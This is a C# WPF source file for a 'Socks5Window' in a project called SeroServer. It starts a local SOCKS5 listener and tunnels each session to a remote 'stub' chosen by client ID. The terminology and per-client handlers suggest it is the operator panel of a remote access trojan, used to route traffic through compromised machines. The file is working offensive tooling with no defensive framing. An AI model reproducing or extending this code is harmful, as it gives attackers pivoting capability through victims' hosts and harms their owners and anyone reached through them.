using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class Socks5Window : Window
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool _maximized;
    private bool _running;
    private TcpListener? _listener;
    private int _connCount;

    // sessionId → TcpClient waiting for data from stub
    private readonly ConcurrentDictionary<string, TcpClient> _pending = new();

    public Socks5Window(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = $"  —  {label}";

        _server.RegisterHandler(clientId, PacketType.SocksConnOk,  OnConnOk);
        _server.RegisterHandler(clientId, PacketType.SocksConnErr, OnConnErr);
        _server.RegisterHandler(clientId, PacketType.SocksData,    OnData);
        _server.RegisterHandler(clientId, PacketType.SocksClose,   OnRemoteClose);

        Closed += (_, _) =>
        {
            StopProxy();
            _server.UnregisterHandler(clientId, PacketType.SocksConnOk);
            _server.UnregisterHandler(clientId, PacketType.SocksConnErr);
            _server.UnregisterHandler(clientId, PacketType.SocksData);
            _server.UnregisterHandler(clientId, PacketType.SocksClose);
        };
    }

    // ── Start / Stop ────────────────────────────────────────────────────────

    private async void BtnStart_Click(object s, RoutedEventArgs e)
    {
        if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
        { TxtStatus.Text = "Invalid port."; return; }

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.SocksStart,
            Data = JsonConvert.SerializeObject(new SocksStartData { LocalPort = port })
        });

        _running = true;
        BtnStart.IsEnabled = false; BtnStop.IsEnabled = true;
        BadgeActive.Visibility = Visibility.Visible;

        try
        {
            _listener = new TcpListener(IPAddress.Loopback, port);
            _listener.Start();
            TxtStatus.Text = $"SOCKS5 listening on 127.0.0.1:{port}";
            AddLog($"[+] Started on port {port}");
            _ = AcceptLoop();
        }
        catch (Exception ex) { TxtStatus.Text = $"Error: {ex.Message}"; StopProxy(); }
    }

    private async void BtnStop_Click(object s, RoutedEventArgs e)
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.SocksStop });
        StopProxy();
    }

    private void StopProxy()
    {
        _running = false;
        _listener?.Stop(); _listener = null;
        foreach (var t in _pending.Values) try { t.Close(); } catch { }
        _pending.Clear();
        Dispatcher.BeginInvoke(() =>
        {
            BtnStart.IsEnabled = true; BtnStop.IsEnabled = false;
            BadgeActive.Visibility = Visibility.Collapsed;
            TxtStatus.Text = "Stopped";
        });
    }

    // ── Local SOCKS5 accept loop ─────────────────────────────────────────────

    private async Task AcceptLoop()
    {
        while (_running)
        {
            try
            {
                var client = await _listener!.AcceptTcpClientAsync();
                _ = HandleLocalClient(client);
            }
            catch { break; }
        }
    }

    private async Task HandleLocalClient(TcpClient client)
    {
        string sessionId = Guid.NewGuid().ToString("N")[..8];
        try
        {
            var stream = client.GetStream();
            var buf = new byte[512];

            // SOCKS5 greeting
            int n = await stream.ReadAsync(buf);
            await stream.WriteAsync(new byte[] { 5, 0 }); // NO AUTH

            // SOCKS5 connect request
            n = await stream.ReadAsync(buf);
            _pending[sessionId] = client;

            // Forward to stub
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.SocksData,
                Data = JsonConvert.SerializeObject(new SocksDataPacket
                {
                    SessionId = sessionId,
                    Data = Convert.ToBase64String(buf, 0, n)
                })
            });

            _connCount++;
            _ = Dispatcher.BeginInvoke(() => TxtConnCount.Text = $"{_connCount} active");
            AddLog($"[>] Session {sessionId}  local:{((System.Net.IPEndPoint?)client.Client.RemoteEndPoint)?.Port}");

            // Now relay from local to stub
            var relay = new byte[8192];
            while (_running && client.Connected)
            {
                int r = await stream.ReadAsync(relay);
                if (r == 0) break;
                await _server.SendToClient(_clientId, new Packet
                {
                    Type = PacketType.SocksData,
                    Data = JsonConvert.SerializeObject(new SocksDataPacket
                    {
                        SessionId = sessionId,
                        Data = Convert.ToBase64String(relay, 0, r)
                    })
                });
            }
        }
        catch { }
        finally
        {
            _pending.TryRemove(sessionId, out _);
            try { client.Close(); } catch { }
            await _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.SocksClose,
                Data = JsonConvert.SerializeObject(new SocksCloseData { SessionId = sessionId })
            });
        }
    }

    // ── Incoming from stub ───────────────────────────────────────────────────

    private void OnConnOk(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
        if (d == null) return;
        if (_pending.TryGetValue(d.SessionId, out var client))
        {
            // Send SOCKS5 success reply
            var reply = new byte[] { 5, 0, 0, 1, 0, 0, 0, 0, 0, 0 };
            try { _ = client.GetStream().WriteAsync(reply); } catch { }
            AddLog($"[✓] {d.SessionId} connected");
        }
    }

    private void OnConnErr(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
        if (d == null) return;
        if (_pending.TryRemove(d.SessionId, out var client))
        {
            var reply = new byte[] { 5, 4, 0, 1, 0, 0, 0, 0, 0, 0 }; // Host unreachable
            try { _ = client.GetStream().WriteAsync(reply); client.Close(); } catch { }
        }
        AddLog($"[✗] {d.SessionId}: {d.Error}");
    }

    private void OnData(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksDataPacket>(pkt.Data);
        if (d == null || string.IsNullOrEmpty(d.Data)) return;
        if (_pending.TryGetValue(d.SessionId, out var client))
        {
            var bytes = Convert.FromBase64String(d.Data);
            try { _ = client.GetStream().WriteAsync(bytes); } catch { }
        }
    }

    private void OnRemoteClose(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<SocksCloseData>(pkt.Data);
        if (d == null) return;
        if (_pending.TryRemove(d.SessionId, out var client))
            try { client.Close(); } catch { }
        AddLog($"[-] {d.SessionId} closed by remote");
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private void AddLog(string msg)
    {
        Dispatcher.BeginInvoke(() =>
        {
            TxtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {msg}\n");
            LogScroll.ScrollToEnd();
        });
    }

    private void BtnMaximize_Click(object s, RoutedEventArgs e)
    {
        _maximized = !_maximized;
        WindowState = _maximized ? WindowState.Maximized : WindowState.Normal;
        RootBorder.CornerRadius = _maximized ? new CornerRadius(0) : new CornerRadius(8);
        BtnMaximize.Content = _maximized ? "❐" : "☐";
    }

    private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
    {
        if (e.LeftButton == MouseButtonState.Pressed && WindowState != WindowState.Maximized)
            DragMove();
    }

    private void ResizeGrip_DragDelta(object s, System.Windows.Controls.Primitives.DragDeltaEventArgs e)
    {
        Width  = Math.Max(MinWidth,  Width  + e.HorizontalChange);
        Height = Math.Max(MinHeight, Height + e.VerticalChange);
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();
}
